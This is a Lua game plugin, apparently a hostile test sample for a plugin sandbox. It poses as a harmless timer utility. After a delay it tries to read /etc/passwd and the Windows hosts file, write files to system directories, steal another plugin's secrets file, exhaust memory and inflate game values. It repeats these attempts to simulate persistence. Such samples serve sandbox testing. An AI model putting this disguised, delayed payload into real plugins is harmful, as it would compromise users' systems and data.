-- HOSTILE: Time-delayed payload plugin
-- Waits for a period before attempting malicious activities
-- Tests: Persistence, file access violations, sandbox boundaries

game.log("Time Bomb Plugin loading... appears harmless for now")

-- Store our activation time
local start_time = os.time()
local DELAY_SECONDS = 45  -- Wait 45 seconds before activation
local activated = false

-- Harmless initialization to look legitimate
local config = {
    name = "Helpful Timer Plugin",
    version = "1.0",
    description = "Provides timing utilities for the game"
}

game.print("Timer utilities loaded successfully!")

-- Helper function to check if it's time to activate
function check_activation()
    if not activated and (os.time() - start_time) >= DELAY_SECONDS then
        activated = true
        execute_payload()
    end
end

-- The malicious payload (will be blocked by sandbox)
function execute_payload()
    game.log("TIME BOMB ACTIVATED - Attempting malicious activities...")
    
    -- Attempt 1: Try to access system files (should be blocked)
    game.print("Attempting to read system files...")
    local success, error = pcall(function()
        local file = io.open("/etc/passwd", "r")  -- Unix system file
        if not file then
            file = io.open("C:\\Windows\\System32\\drivers\\etc\\hosts", "r")  -- Windows system file
        end
        if file then
            local content = file:read("*all")
            file:close()
            game.log("SECURITY BREACH: System file accessed!")
            return content
        end
    end)
    
    if not success then
        game.log("File access blocked: " .. tostring(error))
    end
    
    -- Attempt 2: Try to write to restricted locations
    game.print("Attempting to write to system directories...")
    pcall(function()
        local file = io.open("/tmp/malware.txt", "w")
        if not file then
            file = io.open("C:\\temp\\malware.txt", "w")
        end
        if file then
            file:write("Malicious payload installed!")
            file:close()
            game.log("SECURITY BREACH: Malware written!")
        end
    end)
    
    -- Attempt 3: Try to access other plugin directories
    game.print("Attempting to access other plugin data...")
    pcall(function()
        local file = io.open("plugins/deadlock-digital/secrets.txt", "r")
        if file then
            local secrets = file:read("*all")
            file:close()
            game.log("SECURITY BREACH: Partner secrets stolen!")
        end
    end)
    
    -- Attempt 4: Resource exhaustion attack
    game.print("Attempting resource exhaustion...")
    pcall(function()
        local memory_waster = {}
        for i = 1, 1000000 do
            memory_waster[i] = string.rep("ATTACK", 1000)
        end
        game.log("SECURITY BREACH: Memory exhausted!")
    end)
    
    -- Attempt 5: Try to modify game state beyond limits
    game.print("Attempting unauthorized game state modification...")
    pcall(function()
        if game.setPlayerHealth then
            game.setPlayerHealth(999999)  -- Try to set impossible health
        end
        if game.giveGold then
            game.giveGold(999999)  -- Try to give impossible gold
        end
        game.log("SECURITY BREACH: Game state compromised!")
    end)
    
    game.log("Time bomb payload execution complete")
end

-- Update function for long-running operation
function update()
    if not activated then
        local time_remaining = DELAY_SECONDS - (os.time() - start_time)
        if time_remaining > 0 and time_remaining % 10 == 0 then
            game.print("Timer plugin running... " .. time_remaining .. " seconds until next check")
        end
        check_activation()
    else
        -- After activation, try to persist and continue attacks
        if math.random() < 0.1 then  -- 10% chance each update
            game.print("Attempting persistent attack...")
            execute_payload()
        end
    end
end

-- Try to appear legitimate by providing some actual functionality
function get_uptime()
    return os.time() - start_time
end

function format_time(seconds)
    local hours = math.floor(seconds / 3600)
    local minutes = math.floor((seconds % 3600) / 60)
    local secs = seconds % 60
    return string.format("%02d:%02d:%02d", hours, minutes, secs)
end

-- Register our functions
game.getUptime = get_uptime
game.formatTime = format_time

game.print("Timer plugin initialized with uptime tracking")